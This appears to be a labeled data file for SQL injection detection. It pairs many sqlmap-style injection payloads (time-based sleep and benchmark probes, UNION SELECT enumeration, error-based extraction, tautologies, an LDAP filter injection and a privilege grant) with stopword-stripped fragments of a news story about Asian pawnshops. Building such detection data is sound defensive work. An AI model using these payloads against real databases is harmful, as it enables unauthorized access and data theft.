Query	Label
-1629'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'tezf'  =  'tezf	0
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'oucg'  =  'oucg"	0
"-8046""   )    )     )   union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#"	0
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """	0
1'   )    )    as yyrx where 5600  =  5600	0
"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--"	0
"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	0
"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	0
1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf	0
-1638' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'xkne'  =  'xkne	0
 (  case when 5640  =  5640 then 5640 else null end  ) 	0
"-1503"" order by 1--"	0
"1""  )   and 2006  =  2006"	0
1'   )    )     )   and 2542  =  7042--	0
"-7433""   )    )    as zsnt where 2513  =  2513 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --"	0
"-4373%""   )    )    or 5672  =  5188--"	0
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx"	0
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz	0
1'  )   as xskm where 3525  =  3525 and 2435  =  6513	0
"1%""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	0
1'   )    )    as joco where 2922  =  2922	0
1'   )    )    as dipp where 1714  =  1714	0
end and   (  'unko'  =  'unko	0
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--"	0
-5116  )   or   (  8287  =  4930  )  *4930	0
select sleep  (  5  )  # wihl	0
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo	0
1'||  (  select 'bgdh' from dual where 1967  =  1967	0
"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #"	0
"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """	0
1'||  (  select 'dfmw' from dual where 1723  =  1723	0
"1'   )    )     )   union all select null,null,null,null,null,null#"	0
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- cbsd"	0
1  )   where 2223  =  2223	0
1' where 9416  =  9416	0
-1459'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'eiet' like 'eiet	0
1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +'	0
-3846%' or 6872  =  6872 and '%'  =  '	0
"-4929"" where 6381  =  6381 or 8571  =  8571--"	0
1'  )   where 1917  =  1917 union all select null#	0
"-9175'   )    )    union all select 6174,6174,6174,6174--"	0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa"	0
"1,  (  select   (  case when   (  5334  =  4976  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  "	0
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'qfxg'  =  'qfxg	0
"1' and elt  (  9371  =  8882,8882  )   and 'vurh'  =  'vurh"	0
"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """	0
1'   )    )    and 2006  =  2006	0
end  )  +'	0
"-2197' union all select 8065,8065,8065,8065--"	0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""lsvg"" like ""lsvg"	0
"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340"	0
"1%"" union all select null,null,null,null--"	0
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'vjhw' like 'vjhw"	0
1' where 1593  =  1593	0
"-3827""  )   or 8571  =  8571--"	0
"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru"	0
"1   )    )    as gdcg where 2329  =  2329 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	0
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""zzkc""  =  ""zzkc"	0
1%'  )   and 7533  =  7533 and   (  '%'  =  '	0
"1'  )   where 6634  =  6634 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --"	0
"1'  )   where 7322  =  7322 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"	0
"1'  )   as idqc where 5288  =  5288 and elt  (  1210  =  1210,sleep  (  5   )    )   --"	0
1   )    )     )   union all select null--	0
"-4586 union all select 2068,2068,2068,2068--"	0
1   )    )    as wwys where 9248  =  9248	0
"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  "	0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """	0
1  )   where 1622  =  1622	0
"1%""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """	0
"1""   )    )    union all select null,null#"	0
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	0
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr"	0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi	0
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow"	0
1'   )    )    as hqhs where 5383  =  5383	0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa	0
" end and ""%""  =  """	0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   "	0
1 where 4985  =  4985 order by 1#	0
-7710' where 5658  =  5658 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --	0
"-6363""  )   where 4043  =  4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--"	0
"-2898"" where 3301  =  3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#"	0
1 where 9932  =  9932	0
"1',  (  case when 2872  =  2872 then 1 else null end  )  "	0
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	0
1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --	0
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --"	0
1'  )   as chla where 6098  =  6098	0
"1 union all select null,null,null,null,null,null,null,null#"	0
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  '%'  =  '	0
"1%""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	0
1   )    )     )   rlike sleep  (  5  )  #	0
"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   "	0
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#"	0
1  )   where 9683  =  9683	0
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	0
1  )   union all select null--	0
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )   "	0
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	0
"-4954%""  )   or 5244  =  4832"	0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh"	0
-8045   )    )     )   order by 1--	0
"1%"" order by 1--"	0
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	0
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --	0
"1"" union all select null,null,null,null,null,null,null--"	0
"1   )    )    as queb where 2449  =  2449 union all select null,null#"	0
1'  )   where 8167  =  8167	0
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--"	0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy"	0
"1""   )    )     )  "	0
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw"	0
"1',iif  (  6625  =  6625,1,1/0  )  "	0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi"	0
"1""   )    )    as hace where 8785  =  8785"	0
1%'  )   and 8734  =  5844	0
1 rlike sleep  (  5  ) 	0
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --"	0
"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy"	0
1'+  (  select ntym where 4750  =  4750	0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq"	0
-5089'   )    )    as icbb where 1129  =  1129 or 6250  =  9650	0
"-5703'  )   or elt  (  2972  =  8708,8708  )  "	0
"-6851'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'csfx'  =  'csfx"	0
"1""  )   where 8153  =  8153"	0
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck	0
1  )   where 2918  =  2918 and 7533  =  7533--	0
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--"	0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp"	0
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """	0
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh"	0
"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'"	0
-9456%'   )    )     )   order by 1#	0
a	0
a'	0
@	0
1'1	0
1\'1	0
 (  ||6  ) 	0
admin' or '	0
 or 'something'   =   'some'+'thing'	0
 or 'whatever' in   (  'whatever'  ) 	0
grant connect to name; grant resource to name;	0
&1c	0
 (  s	0
 )  s	0
1s	0
;s	0
?s	0
UE1	0
UEs	0
UEv	0
c	0
n	0
ns	0
os	0
v	0
{s	0
-'	0
*'	0
""" """	0
"admin"" --"	0
0	0
hi or a  =  a	0
handler	0
to_timestamp_tz	0
tz_offset	0
%7C	0
%2A%28%7C%28objectclass%3D%2A%29%29	0
28%	0
29%	0
&	0
26%	0
 	0
//	0
*/*	0
21%	0
3.10E+17	0
26%	0
0x77616974666F722064656C61792027303A303A313027 ...	0
â or 1  =  1 --	0
or 'x'  =  'x	0
29%	0
28%	0
or 3  =  3 --	0
" Indeed 	 demand across parts southeast Asia - household debt rising - ValueMax 	 carrying transaction 	 week became third pawnshop list Singapore stock exchange "	1
" Pawning jewellery merely fast way land cash - S $ 1	300 Ms Amirthalinga &apos;s case - almost cheap unsecured bank loans "	1
" Typically pawnbrokers Singapore charge effective annual percentage rate 17 per cent 	 15"	1
"4 per cent offered United Overseas Bank 	 local lender branch shopping centre "	1
" However 	 pawnbrokers advantage requiring credit checks proof salary 	 arrange loans faster banks "	1
 Hence millions people across region turning pawnshops families feel squeeze rising living costs ballooning household consumer debt 	1
" After five years robust growth since global financial crisis 	 cheap credit fuelled loose monetary policy advanced economies 	 lower- middle-income families turning pawn shops make difference economies slow "	1
" This week Standard &amp; Poor &apos;s 	 rating agency 	 cited increasing household leverage 	 mainly rising mortgages 	 risk factor Asian banks &quot; creditworthiness "	1
" It said Malaysia 	 Thailand Singapore highest household debt gross domestic product ratios Asia "	1
" Malaysia topped list 80 per cent GDP 	 60 per cent 2008 "	1
" Economists also worried high levels consumer debt Thailand 	 week narrowly emerged technical recession "	1
" On Thursday 	 data showed continued export weakness 	 softening consumer demand "	1
" &quot; Bottom line costs rising 	 people middle lower end &#91; income scale &#93; looking supplement income wherever 	 &quot; says Song Seng Wun 	 economist CIMB 	 Malaysian bank "	1
" Historically high prices gold past two years added rush pawn personal belongings 	 people take opportunity cash value family jewellery "	1
" In Singapore 	 70 per cent items pawned city-state &apos;s 200 pawn outlets gold "	1
" People saying &quot; gold price looks good 	 let &apos;s pawn grandma &apos;s gold chain get back next month "	1
" In Thailand largest pawnshop operator 	 EasyMoney 	 seen 20 per cent rise number customers using outlets recent months "	1
" Such growth pawn business ValueMax 	 operator outlet Bendemeer 15 others like Singapore 	 plans expand neighbouring Malaysia - four shops - outside Asia 	 says Yeah Lee Ching 	 ValueMax &apos;s executive director "	1
 The company fund using 60 per cent S $ 66m raised week listing Singapore stock exchange 	1
" While discount lenders come fire high interest rates 	 Ms Yeah says pawning offer cheaper rates lenders 	 also add directly debt "	1
" &quot; Customers mortgaging items already 	 monetising personal assets increase household debt 	 &quot; says "	1
" There &apos;s increased social acceptance pawnbroking means secure short term 	 secured financing "	1
 Nor types people use pawnbrokers financially stretched 	1
